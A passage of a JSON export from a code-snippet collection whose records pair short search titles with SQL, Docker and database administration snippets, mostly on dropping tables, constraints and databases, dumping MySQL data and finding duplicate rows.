    "reg_date": "2021-10-12T09:55:05.000Z"
  },
  {
    "id": 899,
    "keyword": null,
    "link": null,
    "title": " dns slave zone convert",
    "description": "dom=example.com # convert text format zone file to raw named-compilezone -f raw -F text -o ${dom}.text ${dom} ${dom} # convert text format zone file to raw named-compilezone -f text -F raw -o ${dom}.raw ${dom} ${dom}\n",
    "reg_date": "2021-10-12T09:55:05.000Z"
  },
  {
    "id": 900,
    "keyword": null,
    "link": null,
    "title": " dnsmasq.conf location macos",
    "description": "/usr/local/etc/dnsmasq.conf\n",
    "reg_date": "2021-10-12T09:55:05.000Z"
  },
  {
    "id": 901,
    "keyword": null,
    "link": null,
    "title": " doVerify() must be an instance of Lcobucci\\\\JWT\\\\Signer\\\\Key",
    "description": "php artisan jwt:secret\n",
    "reg_date": "2021-10-12T09:55:05.000Z"
  },
  {
    "id": 902,
    "keyword": null,
    "link": null,
    "title": " docker ERROR 2003 (HY000): Can't connect to MySQL server on '127.0.0.1' (61)",
    "description": "# This seems to work... Your milage may vary...  % docker run --rm -d -e MYSQL_ROOT_PASSWORD=pass -p 3325:3306 --name mysql_test mysql:5.7  % mysql -uroot -ppass -h127.0.0.1 -P3325 \n",
    "reg_date": "2021-10-12T09:55:05.000Z"
  },
  {
    "id": 903,
    "keyword": null,
    "link": null,
    "title": " docker conectar a mysql de otro contenedor",
    "description": "$ docker exec -it mysql-db mysql -p ... mysql> create database demo;          Query OK, 1 row affected (0.32 sec)                                        mysql> show databases;                +--------------------+                | Database           |                +--------------------+                | demo               |                | information_schema |                | mysql              |                | performance_schema |                | sys                |                +--------------------+                5 rows in set (0.00 sec)                                                   mysql>                           \n",
    "reg_date": "2021-10-12T09:55:05.000Z"
  },
  {
    "id": 904,
    "keyword": null,
    "link": null,
    "title": " docker create postgres db",
    "description": "$ docker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -p 5432:5432 -d postgres\n# inside Dockerfile COPY your_sql_file.sql /docker-entrypoint-initdb.d/\n",
    "reg_date": "2021-10-12T09:55:06.000Z"
  },
  {
    "id": 905,
    "keyword": null,
    "link": null,
    "title": " docker mysql random root password",
    "description": "$ docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag\n",
    "reg_date": "2021-10-12T09:55:06.000Z"
  },
  {
    "id": 906,
    "keyword": null,
    "link": null,
    "title": " docker run mysql image",
    "description": "$ docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag\n",
    "reg_date": "2021-10-12T09:55:06.000Z"
  },
  {
    "id": 907,
    "keyword": null,
    "link": null,
    "title": " docker run mysql volume",
    "description": "docker run \\ --detach \\ --name=[container_name]\\ --env=\"MYSQL_ROOT_PASSWORD=[my_password]\" \\ --publish 6603:3306 \\ --volume=/root/docker/[container_name]/conf.d:/etc/mysql/conf.d \\ mysql\n",
    "reg_date": "2021-10-12T09:55:06.000Z"
  },
  {
    "id": 908,
    "keyword": null,
    "link": null,
    "title": " docker run postgres locally",
    "description": "$ docker run -d --name my_postgres -v my_dbdata:/var/lib/postgresql/data -p 54320:5432 postgres:11 \n",
    "reg_date": "2021-10-12T09:55:06.000Z"
  },
  {
    "id": 909,
    "keyword": null,
    "link": null,
    "title": " doctors appointment",
    "description": "-- Table structure for table 'appointment_schedule' CREATE TABLE IF NOT EXISTS 'appointment_schedule' (   'id' int(11) NOT NULL AUTO_INCREMENT,   'doctors_id' int(11) NOT NULL,   'working_days' varchar(50) NOT NULL,   'morning_time_start' time DEFAULT NULL,   'morning_time_end' time DEFAULT NULL,   'morning_tokens' int(11) NOT NULL,   'afternoon_time_start' time DEFAULT NULL,   'afternoon_time_end' time DEFAULT NULL,   'afternoon_tokens' int(11) NOT NULL,   'evening_time_start' time DEFAULT NULL,   'evening_time_end' time DEFAULT NULL,   'evening_tokens' int(11) NOT NULL,   PRIMARY KEY ('id') ) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1; -- -------------------------------------------------------- -- Table structure for table 'bookings' CREATE TABLE IF NOT EXISTS 'bookings' (   'id' int(11) NOT NULL AUTO_INCREMENT,   'doctors_id' int(11) NOT NULL,   'appointment_schedule_id' int(11) NOT NULL,   'patients_id' int(11) NOT NULL,   'diseases_description' text NOT NULL,   'datetime_start' datetime NOT NULL,   'datetime_end' datetime NOT NULL,   'status_id' int(11) NOT NULL DEFAULT '1',   PRIMARY KEY ('id') ) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ; -- -------------------------------------------------------- -- Table structure for table 'booking_status' CREATE TABLE IF NOT EXISTS 'booking_status' (   'id' int(11) NOT NULL AUTO_INCREMENT,   'name' varchar(25) NOT NULL,   PRIMARY KEY ('id') ) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;  -- Dumping data for table 'booking_status'     INSERT INTO 'booking_status' ('id', 'name') VALUES (1, 'Pending for Approval'), (2, 'Approved & Booked'), (3, 'Cancelled by User'), (4, 'Visited'), (5, 'User failed to Visit'); -- -------------------------------------------------------- -- Table structure for table 'doctors' CREATE TABLE IF NOT EXISTS 'doctors' (   'id' int(11) NOT NULL AUTO_INCREMENT,   'name' varchar(50) NOT NULL,   'specialization_id' int(11) NOT NULL,   'clinic_name' varchar(50) NOT NULL,   'address' varchar(1000) NOT NULL,   'qualification' varchar(50) NOT NULL,   'rating' int(11) NOT NULL,   PRIMARY KEY ('id') ) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ; -- -------------------------------------------------------- -- Table structure for table 'patients' CREATE TABLE IF NOT EXISTS 'patients' (   'id' int(11) NOT NULL AUTO_INCREMENT,   'first_name' varchar(50) NOT NULL,   'last_name' varchar(50) NOT NULL,   'address' varchar(500) NOT NULL,   'contact' varchar(100) NOT NULL,   PRIMARY KEY ('id') ) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;  -- -------------------------------------------------------- -- Table structure for table 'specialization' CREATE TABLE IF NOT EXISTS 'specialization' (   'id' int(11) NOT NULL AUTO_INCREMENT,   'name' varchar(100) NOT NULL,   PRIMARY KEY ('id') ) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ; \n",
    "reg_date": "2021-10-12T09:55:06.000Z"
  },
  {
    "id": 910,
    "keyword": null,
    "link": null,
    "title": " does insert into overwrite sql",
    "description": "-- INSERT OVERWRITE will overwrite any existing data in the table or partition. unless IF NOT EXISTS is provided for a partition (as of Hive 0.9. 0). -- INSERT INTO will append to the table or partition, keeping the existing data intact. (Note: INSERT INTO syntax is only available starting in version 0.8.)\n",
    "reg_date": "2021-10-12T09:55:06.000Z"
  },
  {
    "id": 911,
    "keyword": null,
    "link": null,
    "title": " doublon sql",
    "description": "-- exemple -- recherche doublon sur la table demande pour les champs :  -- nom_demandeur, prenom_demandeur, actif  SELECT   COUNT(*) AS nbr_doublon, nom_demandeur, prenom_demandeur, actif FROM     demandes GROUP BY nom_demandeur,prenom_demandeur,actif HAVING   COUNT(*) > 1\nSELECT _column, COUNT(*)  FROM _table GROUP BY _column HAVING COUNT(*) > 1\n",
    "reg_date": "2021-10-12T09:55:06.000Z"
  },
  {
    "id": 912,
    "keyword": null,
    "link": null,
    "title": " downgrading flask sqlalchemy",
    "description": "$ pip install -U Flask-SQLAlchemy \n#If u want to add installl a specifc version of sqlachemy   pip install -U Flask-SQLAlchemy==verision   #for example:   pip install -U Flask-SQLAlchemy ==2.1 \n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 913,
    "keyword": null,
    "link": null,
    "title": " download sql server for mac",
    "description": "alias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' \nsudo docker pull mcr.microsoft.com/mssql/server:2019-latest \n1. Pull MSSQL Server from Dockerdocker pull microsoft/msssql-server-linux2. Create an Instance and Serverdocker run -d &mdash; name MSSQL_Server -e &lsquo;ACCEPT_EULA=Y&rsquo; -e &lsquo;SA_PASSWORD= mypassword&rsquo; -p 1433:1433 microsoft/mssql- server-linux3. Download node and install SQL CLI as Adminnpm install -g sql-cli4. Check the containerdocker ps -a5. Run the Servermssql -u sa -p <mypassword>\nselect @@version \n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 914,
    "keyword": null,
    "link": null,
    "title": " drop CHECK constraint sql",
    "description": "DROP CONSTRAINT ConstraintName;\n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 915,
    "keyword": null,
    "link": null,
    "title": " drop a table",
    "description": "DROP TABLE table_name;\n-- Drop, but no space gain DROP TABLE table_name; -- Really frees space (Oracle) DROP TABLE table_name PURGE;\n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 916,
    "keyword": null,
    "link": null,
    "title": " drop all data from tables",
    "description": "DELETE FROM my_table;\t\t\t-- all rows, needs a COMMIT to validate TUNCATE TABLE my_table;\t\t\t-- all rows, quicker, no possible roolback\n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 917,
    "keyword": null,
    "link": null,
    "title": " drop all database tables oracle sql developer",
    "description": "BEGIN    FOR cur_rec IN (SELECT object_name, object_type                    FROM user_objects                    WHERE object_type IN                              ('TABLE',                               'VIEW',                               'MATERIALIZED VIEW',                               'PACKAGE',                               'PROCEDURE',                               'FUNCTION',                               'SEQUENCE',                               'SYNONYM',                               'PACKAGE BODY'                              ))    LOOP       BEGIN          IF cur_rec.object_type = 'TABLE'          THEN             EXECUTE IMMEDIATE 'DROP '                               || cur_rec.object_type                               || ' \"'                               || cur_rec.object_name                               || '\" CASCADE CONSTRAINTS';          ELSE             EXECUTE IMMEDIATE 'DROP '                               || cur_rec.object_type                               || ' \"'                               || cur_rec.object_name                               || '\"';          END IF;       EXCEPTION          WHEN OTHERS          THEN             DBMS_OUTPUT.put_line ('FAILED: DROP '                                   || cur_rec.object_type                                   || ' \"'                                   || cur_rec.object_name                                   || '\"'                                  );       END;    END LOOP;    FOR cur_rec IN (SELECT *                     FROM all_synonyms                     WHERE table_owner IN (SELECT USER FROM dual))    LOOP       BEGIN          EXECUTE IMMEDIATE 'DROP PUBLIC SYNONYM ' || cur_rec.synonym_name;       END;    END LOOP; END; / \n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 918,
    "keyword": null,
    "link": null,
    "title": " drop all foreign key constraints mysql",
    "description": "SET foreign_key_checks = 0;\n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 919,
    "keyword": null,
    "link": null,
    "title": " drop all tables in azure sql database",
    "description": "while(exists(select 1 from INFORMATION_SCHEMA.TABLE_CONSTRAINTS where CONSTRAINT_TYPE='FOREIGN KEY')) begin  declare @sql nvarchar(2000)  SELECT TOP 1 @sql=('ALTER TABLE ' + TABLE_SCHEMA + '.[' + TABLE_NAME  + '] DROP CONSTRAINT [' + CONSTRAINT_NAME + ']')  FROM information_schema.table_constraints  WHERE CONSTRAINT_TYPE = 'FOREIGN KEY'  exec (@sql)  PRINT @sql end   while(exists(select 1 from INFORMATION_SCHEMA.TABLES      where TABLE_NAME != 'database_firewall_rules'      AND TABLE_TYPE = 'BASE TABLE'     AND TABLE_NAME NOT IN (select name from sys.external_tables))) begin  declare @sql1 nvarchar(2000)  SELECT TOP 1 @sql1=('DROP TABLE ' + TABLE_SCHEMA + '.[' + TABLE_NAME + ']')  FROM INFORMATION_SCHEMA.TABLES  WHERE TABLE_NAME != 'database_firewall_rules'     AND TABLE_TYPE = 'BASE TABLE'     AND TABLE_NAME NOT IN (select name from sys.external_tables) exec (@sql1)  PRINT @sql1 end \n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 920,
    "keyword": null,
    "link": null,
    "title": " drop all triggers oracle",
    "description": "select 'drop trigger ' || trigger_name || ';' stmt from user_triggers;\n",
    "reg_date": "2021-10-12T09:55:07.000Z"
  },
  {
    "id": 921,
    "keyword": null,
    "link": null,
    "title": " drop cascade",
    "description": "drop table if exists table_name cascade;\nCREATE TABLE child_table (   column1 datatype [ NULL | NOT NULL ],   column2 datatype [ NULL | NOT NULL ],   ...    CONSTRAINT fk_name     FOREIGN KEY (child_col1, child_col2, ... child_col_n)     REFERENCES parent_table (parent_col1, parent_col2, ... parent_col_n)     ON DELETE CASCADE     [ ON UPDATE { NO ACTION | CASCADE | SET NULL | SET DEFAULT } ]  );\nCREATE TABLE child (     id INT,      parent_id INT,     INDEX par_ind (parent_id),     FOREIGN KEY (parent_id)          REFERENCES parent(id)         ON DELETE CASCADE ) ENGINE=INNODB;\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 922,
    "keyword": null,
    "link": null,
    "title": " drop colum oracle 18c",
    "description": "-- tested on oracle 18c alter table table_name drop column column_name;  -- example alter table products drop column category;\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 923,
    "keyword": null,
    "link": null,
    "title": " drop column if exists sql server",
    "description": "-- SQL Server ALTER TABLE t DROP COLUMN IF EXISTS col1,                     COLUMN IF EXISTS col2;\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 924,
    "keyword": null,
    "link": null,
    "title": " drop columnsql",
    "description": "ALTER TABLE table_name DROP COLUMN column_name\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 925,
    "keyword": null,
    "link": null,
    "title": " drop database",
    "description": "   DROP DATABASE databasename; \nBY LOVE SINGH  USE master; GO ALTER DATABASE OnlineRestaurant2  SET SINGLE_USER  WITH ROLLBACK IMMEDIATE; GO DROP DATABASE OnlineRestaurant2; \nDROP DATABASE ma_base\nThe DROP DATABASE statement drops all tables in the database and deletes the database permanently. Therefore, you should be very careful when using this statement.  The following shows the syntax of the DROP DATABASE statement:  DROP DATABASE [IF EXISTS] database_name;    In MySQL, the schema is the synonym for the database, therefore, you can use them interchangeably:  DROP SCHEMA [IF EXISTS] database_name;\nDROP DATABASE databasename  TO DELETE DATABASE\nDeletes the entire database. Example: Deletes a database named &lsquo;websitesetup&rsquo;. DROP DATABASE websitesetup;\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 926,
    "keyword": null,
    "link": null,
    "title": " drop database postgres",
    "description": "DROP DATABASE IF EXISTS database_name;\n DROP DATABASE dbname;\nCREATE DATABASE testdb1; DROP DATABASE testdb1;\n DROP DATABASE base_de_datos;  // SI SALE ESTE MESAJE DE ERROR HAGA LOS PASOS QUE ESTAN A CONTINUACION ERROR: database \"base_de_datos\" is being accessed by other users SQL state: 55006 Detail: There is 1 other session using the database. ----------------------------------------------------------------------  // primer paso --------------------------------- SELECT * FROM pg_stat_activity WHERE datname = 'base_de_datos';  //segundo paso -------------------------------- SELECT \tpg_terminate_backend (pg_stat_activity.pid) FROM \tpg_stat_activity WHERE \tpg_stat_activity.datname = 'base_de_datos';      // tercer paso -------------------------------- DROP DATABASE 'base_de_datos';  // retira las comillas si no funciona DROP DATABASE base_de_datos;\ndropdb 'database name' \nsql -U <user>  -c \"drop database protodb\"\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 927,
    "keyword": null,
    "link": null,
    "title": " drop database using terminal postgres",
    "description": "sql -U <user>  -c \"drop database protodb\"\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 928,
    "keyword": null,
    "link": null,
    "title": " drop df constraint sql server",
    "description": "ALTER TABLE NameTable\tDROP CONSTRAINT Name_Constraint; -- Example --ALTER TABLE iso.works\tDROP CONSTRAINT DF__works__idSubMont__4D5F7D71;\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 929,
    "keyword": null,
    "link": null,
    "title": " drop foreign key",
    "description": "ALTER TABLE table_name DROP CONSTRAINT fk_name;\n-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nUSE AdventureWorks2012;   GO   ALTER TABLE dbo.DocExe    DROP CONSTRAINT FK_Column_B;    GO   \nALTER TABLEEmployee DROP FOREIGN KEY FK_EmployeeDept; \n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 930,
    "keyword": null,
    "link": null,
    "title": " drop foreign key mysql",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nALTER TABLE jobs DROP FOREIGN KEY constraint_name \nSET foreign_key_checks = 0;\nCREATE TABLE parent (     id INT NOT NULL,     PRIMARY KEY (id) ) ENGINE=INNODB;  CREATE TABLE child (     id INT,     parent_id INT,     INDEX par_ind (parent_id),     FOREIGN KEY (parent_id)         REFERENCES parent(id)         ON DELETE CASCADE ) ENGINE=INNODB;\nALTER TABLE `TABLE_NAME` ADD COLUMN `COLUMN_NAME` BIGINT(20) UNSIGNED NULL DEFAULT NULL AFTER `AFTER_COLUMN_NAME`,  ADD FOREIGN KEY `FOREIGN_RELATION_NAME`(`COLUMN_NAME`) REFERENCES `FOREIGN_TABLE`(`FOREIGN_COLUMN`)  ON UPDATE SET NULL ON DELETE SET NULL\nALTER TABLE table_name DROP FOREIGN KEY constraint_name \n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 931,
    "keyword": null,
    "link": null,
    "title": " drop function",
    "description": "DROP FUNCTION sqrt(integer);\n",
    "reg_date": "2021-10-12T09:55:08.000Z"
  },
  {
    "id": 932,
    "keyword": null,
    "link": null,
    "title": " drop index oracle",
    "description": "DROP INDEX index_name;\nDECLARE    index_not_exists EXCEPTION;    PRAGMA EXCEPTION_INIT (index_not_exists, -1418); BEGIN    EXECUTE IMMEDIATE 'DROP INDEX index_name'; EXCEPTION    WHEN index_not_exists THEN NULL; END;\n",
    "reg_date": "2021-10-12T09:55:09.000Z"
  },
  {
    "id": 933,
    "keyword": null,
    "link": null,
    "title": " drop index sql server",
    "description": " DROP INDEX index_name ON table_name; \n",
    "reg_date": "2021-10-12T09:55:09.000Z"
  },
  {
    "id": 934,
    "keyword": null,
    "link": null,
    "title": " drop multiple columns in sql",
    "description": "//Example ALTER TABLE employees   ADD last_name VARCHAR(50),       first_name VARCHAR(40);\n-- SQL Server ALTER TABLE t DROP COLUMN IF EXISTS col1,                     COLUMN IF EXISTS col2;\nALTER TABLE TableName     DROP COLUMN Column1,     DROP COLUMN Column2; \nALTER TABLE person add  [AdminApproved] BIT default 'FALSE';\n",
    "reg_date": "2021-10-12T09:55:09.000Z"
  },
  {
    "id": 935,
    "keyword": null,
    "link": null,
    "title": " drop primary key",
    "description": "ALTER TABLE [table_name] DROP CONSTRAINT [primary_key_name]\n alter table Player DROP PRIMARY KEY;\nALTER TABLE table_name DROP CONSTRAINT fk_name;\nALTER TABLE Student DROP PRIMARY KEY; \n",
    "reg_date": "2021-10-12T09:55:09.000Z"
  },
  {
    "id": 936,
    "keyword": null,
    "link": null,
    "title": " drop primary key oracle",
    "description": "-- Adding Using alter ALTER TABLE table_name ADD CONSTRAINT constraint_name PRIMARY KEY (column1, column2, ... column_n);\n-- Dropping Using alter ALTER TABLE table_name DROP CONSTRAINT constraint_name;\n",
    "reg_date": "2021-10-12T09:55:09.000Z"
  },
  {
    "id": 937,
    "keyword": null,
    "link": null,
    "title": " drop sequence",
    "description": "DECLARE     s_exist NUMBER(1); BEGIN     SELECT CASE WHEN exists(SELECT * FROM ALL_SEQUENCES                             WHERE SEQUENCE_NAME = 'seq_name') THEN 1        \tELSE 0      END INTO s_exist FROM DUAL;     IF s_exist = 1 THEN         EXECUTE IMMEDIATE 'DROP SEQUENCE seq_name';     END IF; END;\n",
    "reg_date": "2021-10-12T09:55:09.000Z"
  },
  {
    "id": 938,
    "keyword": null,
    "link": null,
    "title": " drop stored procedure mysql",
    "description": "DROP PROCEDURE [IF EXISTS] stored_procedure_name;\nmysql> DELIMITER // ; mysql> Create Procedure Delete_studentinfo ( IN p_id INT)     -> BEGIN     -> DELETE FROM student_info     -> WHERE ID=p_id;     -> END // Query OK, 0 rows affected (0.11 sec)  mysql> DELIMITER ; //\n",
    "reg_date": "2021-10-12T09:55:09.000Z"
  },
  {
    "id": 939,
    "keyword": null,
    "link": null,
    "title": " drop table",
    "description": "DROP TABLE table_name;\n-- Drop, but no space gain DROP TABLE table_name; -- Really frees space (Oracle) DROP TABLE table_name PURGE;\n",
    "reg_date": "2021-10-12T09:55:09.000Z"
  },
  {
    "id": 940,
    "keyword": null,
    "link": null,
    "title": " drop table if exists",
    "description": "DROP TABLE IF EXISTS dbo.Customers \nDROP TABLE IF EXISTS dbo.Scores\nIF OBJECT_ID('dbo.Scores', 'U') IS NOT NULL DROP TABLE dbo.Scores; \nIF OBJECT_ID('dbo.Scores', 'U') IS NOT NULL    DROP TABLE dbo.Scores;  \n-- Classic table IF OBJECT_ID('my_schema.my_table', 'U') IS NOT NULL DROP TABLE my_schema.my_table;  -- Temporary table IF OBJECT_ID('tempdb.my_schema.#my_table') IS NOT NULL DROP TABLE #my_table; \nIF EXISTS(SELECT *           FROM   dbo.Scores)   DROP TABLE dbo.Scores \n",
    "reg_date": "2021-10-12T09:55:10.000Z"
  },
  {
    "id": 941,
    "keyword": null,
    "link": null,
    "title": " drop table if exists in postgres",
    "description": "drop table if exists tableName\n",
    "reg_date": "2021-10-12T09:55:10.000Z"
  },
  {
    "id": 942,
    "keyword": null,
    "link": null,
    "title": " drop table if exists oracle",
    "description": "DECLARE     existing_table number; BEGIN     SELECT count(*) into existing_table FROM ALL_TABLES     WHERE TABLE_NAME = 'table_name' AND OWNER = 'owner';     IF existing_table = 1 then         EXECUTE IMMEDIATE 'DROP TABLE owner.table_name';     END IF; END; / CREATE TABLE owner.table_name (BDAY DATE, [...]); \n",
    "reg_date": "2021-10-12T09:55:10.000Z"
  },
  {
    "id": 943,
    "keyword": null,
    "link": null,
    "title": " drop table if exists test",
    "description": "DECLARE\t\t\t\t\t\t\t\t-- Oracle     existing_table number;\t\t\t BEGIN     SELECT count(*) into existing_table FROM ALL_TABLES     WHERE TABLE_NAME = 'table_name' AND OWNER = 'owner';     IF existing_table = 1 then         EXECUTE IMMEDIATE 'DROP TABLE owner.table_name';     END IF; END; / CREATE TABLE owner.table_name (BDAY DATE, [...]); \nIF EXISTS(SELECT *           FROM   dbo.Scores)   DROP TABLE dbo.Scores \n",
    "reg_date": "2021-10-12T09:55:10.000Z"
  },
  {
    "id": 944,
    "keyword": null,
    "link": null,
    "title": " drop table in mysql",
    "description": "DROP TABLE table_name;\nDELETE FROM `table_name` [WHERE condition];\n-- 'DROP TABLE' followed by the name of the table you would like -- to drop. DROP TABLE `test_table`;\nDROP TABLE tablename;\ndelete table query  DROP TABLE <table name; e.g. DROP TABLE students;\nTo remove existing tables, you use the MySQL DROP TABLE statement.  Here is the basic syntax of the DROP TABLE statement:  DROP [TEMPORARY] TABLE [IF EXISTS] table_name [, table_name] ... [RESTRICT | CASCADE] The DROP TABLE statement removes a table and its data permanently from the database. In MySQL, you can also remove multiple tables using a single DROP TABLE statement, each table is separated by a comma (,).  The TEMPORARY option allows you to remove temporary tables only. It ensures that you do not accidentally remove non-temporary tables.  The IF EXISTS option conditionally drop a table only if it exists. If you drop a non-existing table with the IF EXISTS option, MySQL generates a NOTE, which can be retrieved using the SHOW WARNINGS statement.  Note that the DROP TABLE statement only drops tables. It doesn&rsquo;t remove specific user privileges associated with the tables. Therefore, if you create a table with the same name as the dropped one, MySQL will apply the existing privileges to the new table, which may pose a security risk.  The RESTRICT and CASCADE  options are reserved for the future versions of MySQL.\n",
    "reg_date": "2021-10-12T09:55:10.000Z"
  },
  {
    "id": 945,
    "keyword": null,
    "link": null,
    "title": " drop table with constraints",
    "description": "1. 'First Drop contrstraints like this' ALTER TABLE table_name DROP CONSTRAINT constraint_name; 2. 'Then drop table' DROP TABLE table_name;\n",
    "reg_date": "2021-10-12T09:55:10.000Z"
  },
  {
    "id": 946,
    "keyword": null,
    "link": null,
    "title": " drop unique key constraint in sql server",
    "description": "SHOW CREATE TABLE [tableName] -- Find the constraintID after CONSTRAINT 'constraintID' ALTER TABLE [tableName] DROP FOREIGN KEY constraintID\n/* To Drop Unique Key Constraint*/ ALTER TABLE Table_Name DROP CONSTRAINT Constraint_Name\nexample: alter table DropIndex drop index BookId ;\n",
    "reg_date": "2021-10-12T09:55:10.000Z"
  },
  {
    "id": 947,
    "keyword": null,
    "link": null,
    "title": " drop view in mysql",
    "description": "                                     DROP VIEW [IF EXISTS] view_name; \n",
    "reg_date": "2021-10-12T09:55:10.000Z"
  },
  {
    "id": 948,
    "keyword": null,
    "link": null,
    "title": " drop vs truncate vs delete",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 949,
    "keyword": null,
    "link": null,
    "title": " dropping a  constraint in ms sql",
    "description": "/*Dropping a Constraint*/ ALTER TABLE (Table_Name) DROP CONSTRAINT (Constraint_Name)\n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 950,
    "keyword": null,
    "link": null,
    "title": " drush SQLSTATE[HY000] [2002] No such file or directory",
    "description": "$databases['default']['default'] = array (   'database' => 'drupal',   'username' => 'root',   'password' => 'root',   'prefix' => '',   'host' => '127.0.0.1',   'port' => '3306',   'namespace' => 'Drupal\\\\Core\\\\Database\\\\Driver\\\\mysql',   'driver' => 'mysql',   'unix_socket' => '/Applications/MAMP/tmp/mysql/mysql.sock', );\n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 951,
    "keyword": null,
    "link": null,
    "title": " drush sql-dump",
    "description": "drush sql-dump --result-file=../18.sql\n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 952,
    "keyword": null,
    "link": null,
    "title": " dump multiple tables mysql",
    "description": "mysqldump -h<hostname> -u<username> -p  <databasename>  <table1> <table2> <table3> --single-transaction --no-create-info > dumpfile.sql \n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 953,
    "keyword": null,
    "link": null,
    "title": " dump mysql",
    "description": "mysqldump -u username -p database_name > data-dump.sql\nmysqldump -u username -p dbname > filename.sql\n# Syntax mysqldump -u [username] -p [database-to-dump] > [database-to-receive]  # Pipe it! Exporting DB from external host mysqldump -u [username] -P [port] -h [host] [database-to-dump] | mysql -u root -h 127.0.0.1 [database-to-receive]  # Export specific tables by typing the name after the targeted DB mysqldump -u [username] -P [port] -h [host] [database-to-dump] [tabl1] [table2] [table3] | mysql -u root -h 127.0.0.1 [database-to-receive]\nmysql -u username -p dbname < filename.sql\nmysqldump -u username -p --skip-lock-tables database_name > path/filename.sql\ntar -xzOf your_db_dump.sql.tar.gz | mysql -u USERNAME -pPASSWORD your_database \n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 954,
    "keyword": null,
    "link": null,
    "title": " duplicate record mysql",
    "description": "CREATE table `duplicat` LIKE `orginal`; INSERT `duplicat` SELECT * FROM `orginal`;\nSELECT col, COUNT(col) FROM table_name GROUP BY col HAVING COUNT(col) > 1;\nSELECT      col1, COUNT(col1),     col2, COUNT(col2) FROM     table_name GROUP BY      col1,      col2 HAVING         (COUNT(col1) > 1) AND         (COUNT(col2) > 1); \nSELECT firstname,     lastname,     list.address  FROM list    INNER JOIN (SELECT address                FROM   list                GROUP  BY address                HAVING COUNT(id) > 1) dup            ON list.address = dup.address; \n                                                     SELECT      col,      COUNT(col) FROM     table_name GROUP BY col HAVING COUNT(col) > 1; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 955,
    "keyword": null,
    "link": null,
    "title": " duplicate records in sql",
    "description": "SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1 \nSELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\nMultiple field= SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1  Single field= SELECT _column, COUNT(*)  FROM _table GROUP BY _column HAVING COUNT(*) > 1\n",
    "reg_date": "2021-10-12T09:55:11.000Z"
  },
  {
    "id": 956,
    "keyword": null,
    "link": null,
    "title": " duplicate table sql",
